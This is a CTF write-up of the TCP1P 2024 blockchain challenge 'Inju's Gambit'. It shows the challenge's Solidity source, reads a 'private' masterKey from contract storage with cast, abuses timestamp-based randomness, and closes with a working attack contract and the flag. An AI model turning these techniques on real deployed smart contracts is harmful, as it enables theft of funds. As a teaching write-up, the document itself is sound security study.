---
layout: post
title: "Inju's Gambit - tcp1p 2024"
date: 2024-10-11 12:00:00
categories: writeups
tags: blockchain 2024
excerpt: Inju owns all the things in the area, waiting for one worthy challenger to emerge. Rumor said, that there many ways from many different angles to tackle Inju. Are you the Challenger worthy to oppose him?
mathjax: false
---
* content
{:toc}
144 points - 16 solves

**Author**: Kiinzu

### Challenge Description
Inju owns all the things in the area, waiting for one worthy challenger to emerge. Rumor said, that there many ways from many different angle to tackle Inju. Are you the Challenger worthy to oppose him?

We are given the following Solidity source files:

Setup.sol
```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import "./Privileged.sol";
import "./ChallengeManager.sol";

contract Setup {
    Privileged public privileged;
    ChallengeManager public challengeManager;
    Challenger1 public Chall1;
    Challenger2 public Chall2;

    constructor(bytes32 _key) payable{
        privileged = new Privileged{value: 100 ether}();
        challengeManager = new ChallengeManager(address(privileged), _key);
        privileged.setManager(address(challengeManager));

        // prepare the challenger
        Chall1 = new Challenger1{value: 5 ether}(address(challengeManager));
        Chall2 = new Challenger2{value: 5 ether}(address(challengeManager));
    }

    function isSolved() public view returns(bool){
        return address(privileged.challengeManager()) == address(0);
    }
}

contract Challenger1 {
    ChallengeManager public challengeManager;

    constructor(address _target) payable{
        require(msg.value == 5 ether);
        challengeManager = ChallengeManager(_target);
        challengeManager.approach{value: 5 ether}();

    }
}

contract Challenger2 {
    ChallengeManager public challengeManager;

    constructor(address _target) payable{
        require(msg.value == 5 ether);
        challengeManager = ChallengeManager(_target);
        challengeManager.approach{value: 5 ether}();
    }
}
```

Privileged.sol
```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract Privileged{

    error Privileged_NotHighestPrivileged();
    error Privileged_NotManager();

    struct casinoOwnerChallenger{
        address challenger;
        bool isRich;
        bool isImportant;
        bool hasConnection;
        bool hasVIPCard;
    }

    address public challengeManager;
    address public casinoOwner;
    uint256 public challengerCounter = 1;

    mapping(uint256 challengerId => casinoOwnerChallenger) public Requirements;

    modifier onlyOwner() {
        if(msg.sender != casinoOwner){
            revert Privileged_NotHighestPrivileged();
        }
        _;
    }

    modifier onlyManager() {
        if(msg.sender != challengeManager){
            revert Privileged_NotManager();
        }
        _;
    }

    constructor() payable{
        casinoOwner = msg.sender;
    }

    function setManager(address _manager) public onlyOwner{
        challengeManager = _manager;
    }

    function fireManager() public onlyOwner{
        challengeManager = address(0);
    }

    function setNewCasinoOwner(address _newCasinoOwner) public onlyManager{
        casinoOwner = _newCasinoOwner;
    }

    function mintChallenger(address to) public onlyManager{
        uint256 newChallengerId = challengerCounter++;

        Requirements[newChallengerId] = casinoOwnerChallenger({
            challenger: to,
            isRich: false,
            isImportant: false,
            hasConnection: false,
            hasVIPCard: false
        });
    }

    function upgradeAttribute(uint256 Id, bool _isRich, bool _isImportant, bool _hasConnection, bool _hasVIPCard) public onlyManager {
        Requirements[Id] = casinoOwnerChallenger({
            challenger: Requirements[Id].challenger,
            isRich: _isRich,
            isImportant: _isImportant,
            hasConnection: _hasConnection,
            hasVIPCard: _hasVIPCard
        });
    }

    function resetAttribute(uint256 Id) public onlyManager{
        Requirements[Id] = casinoOwnerChallenger({
            challenger: Requirements[Id].challenger,
            isRich: false,
            isImportant: false,
            hasConnection: false,
            hasVIPCard: false
        });
    }

    function getRequirmenets(uint256 Id) public view returns (casinoOwnerChallenger memory){
        return Requirements[Id];
    }

    function getNextGeneratedId() public view returns (uint256){
        return challengerCounter;
    }

    function getCurrentChallengerCount() public view returns (uint256){
        return challengerCounter - 1;
    }
}
```

ChallengeManager.sol
```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import "./Privileged.sol";

contract ChallengeManager{

    Privileged public privileged;

    error CM_FoundChallenger();
    error CM_NotTheCorrectValue();
    error CM_AlreadyApproached();
    error CM_InvalidIdOfChallenger();
    error CM_InvalidIdofStranger();
    error CM_CanOnlyChangeSelf();

    bytes32 private masterKey;
    bool public qualifiedChallengerFound;
    address public theChallenger;
    address public casinoOwner;
    uint256 public challengingFee;
    
    address[] public challenger;

    mapping (address => bool) public approached;

    modifier stillSearchingChallenger(){
        require(!qualifiedChallengerFound, "New Challenger is Selected!");
        _;
    }

    modifier onlyChosenChallenger(){
        require(msg.sender == theChallenger, "Not Chosen One");
        _;
    }

    constructor(address _priv, bytes32 _masterKey) {
        casinoOwner = msg.sender;
        privileged = Privileged(_priv);
        challengingFee = 5 ether;
        masterKey = _masterKey;
    }

    function approach() public payable {
        if(msg.value != 5 ether){
            revert CM_NotTheCorrectValue();
        }
        if(approached[msg.sender] == true){
            revert CM_AlreadyApproached();
        }
        approached[msg.sender] = true;
        challenger.push(msg.sender);
        privileged.mintChallenger(msg.sender);
    }

    function upgradeChallengerAttribute(uint256 challengerId, uint256 strangerId) public stillSearchingChallenger {
        if (challengerId > privileged.challengerCounter()){
            revert CM_InvalidIdOfChallenger();
        }
        if(strangerId > privileged.challengerCounter()){
            revert CM_InvalidIdofStranger();
        }
        if(privileged.getRequirmenets(challengerId).challenger != msg.sender){
            revert CM_CanOnlyChangeSelf();
        }

        uint256 gacha = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp))) % 4;

        if (gacha == 0){
            if(privileged.getRequirmenets(strangerId).isRich == false){
                privileged.upgradeAttribute(strangerId, true, false, false, false);
            }else if(privileged.getRequirmenets(strangerId).isImportant == false){
                privileged.upgradeAttribute(strangerId, true, true, false, false);
            }else if(privileged.getRequirmenets(strangerId).hasConnection == false){
                privileged.upgradeAttribute(strangerId, true, true, true, false);
            }else if(privileged.getRequirmenets(strangerId).hasVIPCard == false){
                privileged.upgradeAttribute(strangerId, true, true, true, true);
                qualifiedChallengerFound = true;
                theChallenger = privileged.getRequirmenets(strangerId).challenger;
            }
        }else if (gacha == 1){
            if(privileged.getRequirmenets(challengerId).isRich == false){
                privileged.upgradeAttribute(challengerId, true, false, false, false);
            }else if(privileged.getRequirmenets(challengerId).isImportant == false){
                privileged.upgradeAttribute(challengerId, true, true, false, false);
            }else if(privileged.getRequirmenets(challengerId).hasConnection == false){
                privileged.upgradeAttribute(challengerId, true, true, true, false);
            }else if(privileged.getRequirmenets(challengerId).hasVIPCard == false){
                privileged.upgradeAttribute(challengerId, true, true, true, true);
                qualifiedChallengerFound = true;
                theChallenger = privileged.getRequirmenets(challengerId).challenger;
            }
        }else if(gacha == 2){
            privileged.resetAttribute(challengerId);
            qualifiedChallengerFound = false;
            theChallenger = address(0);
        }else{
            privileged.resetAttribute(strangerId);
            qualifiedChallengerFound = false;
            theChallenger = address(0);
        }
    }

    function challengeCurrentOwner(bytes32 _key) public onlyChosenChallenger{
        if(keccak256(abi.encodePacked(_key)) == keccak256(abi.encodePacked(masterKey))){
            privileged.setNewCasinoOwner(address(theChallenger));
        }        
    }
 
    function getApproacher(address _who) public view returns(bool){
        return approached[_who];
    }

    function getPrivilegedAddress() public view returns(address){
        return address(privileged);
    }

}
```

Blockchain challenges typically come with a challenge instancer to ensure everyone works and deploys contracts on their own chain. In TCP1P the instancer looks like this:

![instancer](../../../../images/TCP1P2024/instancer.png)

From the image we are given a bit of initial information:

1. The address of the Setup contract (source shown above)
2. Our sample wallet address and private key
3. The RPC url to connect to our instance of the chain

The flag button calls the function `isSolved()` on the setup contract and if that returns true, then we get the flag.

So lets do a quick analysis of the Setup contract.

```js
contract Setup {
    Privileged public privileged;
    ChallengeManager public challengeManager;
    Challenger1 public Chall1;
    Challenger2 public Chall2;

    constructor(bytes32 _key) payable{
        privileged = new Privileged{value: 100 ether}();
        challengeManager = new ChallengeManager(address(privileged), _key);
        privileged.setManager(address(challengeManager));

        // prepare the challenger
        Chall1 = new Challenger1{value: 5 ether}(address(challengeManager));
        Chall2 = new Challenger2{value: 5 ether}(address(challengeManager));
    }

    function isSolved() public view returns(bool){
        return address(privileged.challengeManager()) == address(0);
    }
}
```

We know the Setup contract already exists, so this means the constructor has already been called. The constructor makes a new instance of the Privileged contract and gives it 100 ether. Then it makes a new instance of the ChallengeManager contract with an unknown key passed to the constructor, and calls the `setManager` function of the priveleged contract. Next we create sample `Challengers` and give each of them 5 ether.  

```js
function setManager(address _manager) public onlyOwner{
        challengeManager = _manager;
}
```

To get `isSolved()` to return true, we need to get the `challengeManager()` attribute of the privileged contract to be the zero address (`0x000...`).

The next step is to look through ways that we can set the `challengeManager()` attribute of the privileged contract to zero.

In Privileged.sol

```js
function fireManager() public onlyOwner{
        challengeManager = address(0);
}
```

Okay, so calling `priveleged.fireManager()` essentially solves the challenge. But we can't just call this function as it is protected by the `onlyOwner` guard.

```js
modifier onlyOwner() {
        if(msg.sender != casinoOwner){
            revert Privileged_NotHighestPrivileged();
        }
        _;

}
```

`msg.sender` is just the address of whoever is calling a function, so we need to have our calling contract be the `casinoOwner`. Lets find out who the current casinoOwner is.

The constructor of the `Privleged` contract looks like this:
```js
constructor() payable{
    casinoOwner = msg.sender;
}
```

It is called by the `Setup` contract, which means the `casinoOwner` is the address of the `Setup` contract which we cannot spoof ourselves as.

So we need to look for some way to change the `casinoOwner`.

There is an interesting function in `ChallengeManager.sol`

```js
function challengeCurrentOwner(bytes32 _key) public onlyChosenChallenger{
    if(keccak256(abi.encodePacked(_key)) == keccak256(abi.encodePacked(masterKey))){
        privileged.setNewCasinoOwner(address(theChallenger));
    }        
}
```

The `challengeCurrentOwner(bytes32 _key)` function allows us to call `priveleged.setNewCasinoOwner()` if we know the masterKey of the `ChallengeManager.sol` contract and if we pass the `onlyChosenChallenger` guard.

Setup.sol's constructor creates the `ChallengeManager` with a secret key which we don't know.
```js
constructor(bytes32 _key) payable{
    privileged = new Privileged{value: 100 ether}();
    challengeManager = new ChallengeManager(address(privileged), _key);
    privileged.setManager(address(challengeManager));

    // prepare the challenger
    Chall1 = new Challenger1{value: 5 ether}(address(challengeManager));
    Chall2 = new Challenger2{value: 5 ether}(address(challengeManager));
}
```

`ChallengeManager`'s constructor sets the private variable `masterKey` attribute to this secret key in its constructor:
```js
bytes32 private masterKey;

constructor(address _priv, bytes32 _masterKey) {
    casinoOwner = msg.sender;
    privileged = Privileged(_priv);
    challengingFee = 5 ether;
    masterKey = _masterKey;
}
```

One thing to note about `Ethereum` based contracts is that the whole idea is for everything to be publically avaliable. This includes a contract's storage variables. The `private` keyword makes this variable inaccessible through Solidity, but it is still publically accessible if you look through the contract's storage manually.

This [blog](https://quillaudits.medium.com/accessing-private-data-in-smart-contracts-quillaudits-fe847581ce6d) has a pretty good explanation of how memory storage in Ethereum contracts work.

I'll give a basic summary of how it works. 

The Ethereum Virtual Machine stores smart contract data in a large array of 32 byte "slots". The EVM stores smart contract state variables in the order that they were declared in slots on the blockchain. The default value of each slot is always 0, so we do not need to assign a value to 0 when the new declaration is.

Taking a look at the `ChallengeManager` contract, the order of contract variables is as follows:

```js
Privileged public privileged;
bytes32 private masterKey;
bool public qualifiedChallengerFound;
address public theChallenger;
address public casinoOwner;
uint256 public challengingFee;
```

Addresses of contracts and addresses in general are `20 bytes`.

The layout of the variables is shown below:
```js
Privileged public privileged; //0th slot
bytes32 private masterKey; //1st slot
bool public qualifiedChallengerFound; //2nd slot
address public theChallenger; //2nd slot
address public casinoOwner; //3rd slot
uint256 public challengingFee; //4th slot
```

So if we check the first slot of memory of the `ChallengeManager` contract we can find the value of the `masterKey`.

[Foundry](https://book.getfoundry.sh/) comes with a tool called `cast` which allows us to step through a contract's storage.

The address of the `ChallengeManager` and `Privileged` contract are publically accessible through the `Setup` contract.

We can get the values of these with cast and just call the contract's function. Starting up the instancer we get:

```
Setup address: 0x80614CC59f6182650d8dDD6f859a791C8C98656C
RPC Url: http://ctf.tcp1p.team:44445/e53b0234-91aa-42dc-97a0-4c905c0f231f
```

{: .note }
These values do not match the screenshot of the instancer page, I just started a new instance to get these values.

```sh
cast call 0x80614CC59f6182650d8dDD6f859a791C8C98656C "challengeManager()" --rpc-
url http://ctf.tcp1p.team:44445/e53b0234-91aa-42dc-97a0-4c905c0f231f
```

`0x000000000000000000000000aa7ad9f14fc5184e151546e44bb9311ecf46d40a`

So the address of the `ChallengeManager` contract is `0xaa7ad9f14fc5184e151546e44bb9311ecf46d40a`

Now we can use cast again to get slot 1 of the storage of the `ChallengeManager` contract.

```sh
cast storage aa7ad9f14fc5184e151546e44bb9311ecf46d40a 1 --rpc-url http://ctf.tcp1p.team:44445/e53b0234-91aa-42dc-97a0-4c905c0f231f
```

`0x494e4a55494e4a55494e4a5553555045524b45594b45594b45594b45594b4559`

So the value of the `masterKey` is `0x494e4a55494e4a55494e4a5553555045524b45594b45594b45594b45594b4559`

Next we need to bypass the `onlyChosenChallenger` guard of the `challengeCurrentOwner` function.

The guard is shown below:

```js
modifier onlyChosenChallenger(){
    require(msg.sender == theChallenger, "Not Chosen One");
    _;
}
```

Now we need our calling address to be the value of the `theChallenger` variable.

The `upgradeChallengerAttribute()` function lets us do that but we need to pass the `stillSearchingChallenger` guard.

```js
function upgradeChallengerAttribute(uint256 challengerId, uint256 strangerId) public stillSearchingChallenger {
    if (challengerId > privileged.challengerCounter()){
        revert CM_InvalidIdOfChallenger();
    }
    if(strangerId > privileged.challengerCounter()){
        revert CM_InvalidIdofStranger();
    }
    if(privileged.getRequirmenets(challengerId).challenger != msg.sender){
        revert CM_CanOnlyChangeSelf();
    }

    uint256 gacha = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp))) % 4;

    if (gacha == 0){
        if(privileged.getRequirmenets(strangerId).isRich == false){
            privileged.upgradeAttribute(strangerId, true, false, false, false);
        }else if(privileged.getRequirmenets(strangerId).isImportant == false){
            privileged.upgradeAttribute(strangerId, true, true, false, false);
        }else if(privileged.getRequirmenets(strangerId).hasConnection == false){
            privileged.upgradeAttribute(strangerId, true, true, true, false);
        }else if(privileged.getRequirmenets(strangerId).hasVIPCard == false){
            privileged.upgradeAttribute(strangerId, true, true, true, true);
            qualifiedChallengerFound = true;
            theChallenger = privileged.getRequirmenets(strangerId).challenger;
        }
    }else if (gacha == 1){
        if(privileged.getRequirmenets(challengerId).isRich == false){
            privileged.upgradeAttribute(challengerId, true, false, false, false);
        }else if(privileged.getRequirmenets(challengerId).isImportant == false){
            privileged.upgradeAttribute(challengerId, true, true, false, false);
        }else if(privileged.getRequirmenets(challengerId).hasConnection == false){
            privileged.upgradeAttribute(challengerId, true, true, true, false);
        }else if(privileged.getRequirmenets(challengerId).hasVIPCard == false){
            privileged.upgradeAttribute(challengerId, true, true, true, true);
            qualifiedChallengerFound = true;
            theChallenger = privileged.getRequirmenets(challengerId).challenger;
        }
    }else if(gacha == 2){
        privileged.resetAttribute(challengerId);
        qualifiedChallengerFound = false;
        theChallenger = address(0);
    }else{
        privileged.resetAttribute(strangerId);
        qualifiedChallengerFound = false;
        theChallenger = address(0);
    }
}
```

The `stillSearchingChallenger` is shown below:

```js
modifier stillSearchingChallenger(){
    require(!qualifiedChallengerFound, "New Challenger is Selected!");
    _;
}
```

The `qualifiedChallengerFound` variable is false by default, so we can call `upgradeChallengerAttribute`, it is only updated to true, when we become the `theChallenger`. 

This function takes two inputs `challengerId` and `strangerId`. It has a `semi-random` gacha variable that sets/resets the attributes of our `challengerId` or sets/resets the attributes of `strangerId`. The `challengerId` or the `strangerId` is just the index in a list of structs which has an address attribute. We can get our contract's address in the list of structs by calling the `challengeManager`'s `approach()` function.

```js
function approach() public payable {
    if(msg.value != 5 ether){
        revert CM_NotTheCorrectValue();
    }
    if(approached[msg.sender] == true){
        revert CM_AlreadyApproached();
    }
    approached[msg.sender] = true;
    challenger.push(msg.sender);
    privileged.mintChallenger(msg.sender);
}
```

If we repeatedly call the `upgradeChallengerAttribute` function the entire "transaction" is stored in a single block, so the `block.timestamp` is always the same.

So if we call the `upgradeChallengerAttribute` with both the `challengerId` and the `strangerId` as the same value repeatedly, we have a 50% chance to become `theChallenger`.

Now we can write an attack contract that accomplishes the above.

```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {ChallengeManager} from "../src/ChallengeManager.sol";
import {Privileged} from "../src/Privileged.sol";
import {Setup} from "../src/Setup.sol";

contract Attack {

    struct casinoOwnerChallenger{
        address challenger;
        bool isRich;
        bool isImportant;
        bool hasConnection;
        bool hasVIPCard;
    }

    Setup public setup;
    ChallengeManager public cm;
    Privileged public pr;

    constructor() {
        setup = Setup(address(0x9c247DA084FD8390dEC3722772299Ac864ce2e30));
        cm = setup.challengeManager();
        pr = setup.privileged();
    }

    function attack() public payable {
        cm.approach{value: msg.value}();
        while (true) {
            if (cm.qualifiedChallengerFound()) {
                break;
            }
            cm.upgradeChallengerAttribute(uint256(3), uint256(3));
        }
        cm.challengeCurrentOwner(bytes32(0x494e4a55494e4a55494e4a5553555045524b45594b45594b45594b45594b4559));
        pr.fireManager();
    }

    function isSolved() public returns (bool) {
        return setup.isSolved();
    }
}
```

A quick summary of what the contract is doing:

1. First we attach to the Setup contract running at the given address (in this case `0x9c247DA084FD8390dEC3722772299Ac864ce2e30`)
2. Get the addresses of the `Privilged` and `ChallengeManager` contracts
3. Call the `attack()` function
     - Calls `ChallengeManager.approach()` to register the attack contract as a `Challenger`
     - Repeatedly call `upgradeChallengerAttribute` (we use `id` 3 because the Setup contract creates two challengers before us).
     - Once the `qualifiedChallengerFound()` function returns true, we know we are `theChallenger` so we can break.
     - Call `challengeCurrentOwner()` with the private bytes we found earlier.
     - Fire the current manager with `fireManager()`
4. Now the current manager's address is the zero address, and any calls to `isSolved()` return `true`

We can now deploy this contract and call the `attack()` function.

Since `isSolved()` now returns true, we can press the flag button on the instancer, and we get the flag:

`TCP1P{is_it_really_a_gambit_tho_its_not_that_hard}`

### Summary

Overall I thought this challenge was really fun, and it used some basic Blockchain concepts in a unique way. I had a small headache moment when calling the `upgradeChallengerAttribute()` as I did not realize that the `gacha` variable never actually changes on repeated calls since the block timestamp is always the same, causing an infinite loop. Big thanks to `Kiinzu` for making this fun challenge and hope to see more Blockchain next year :).












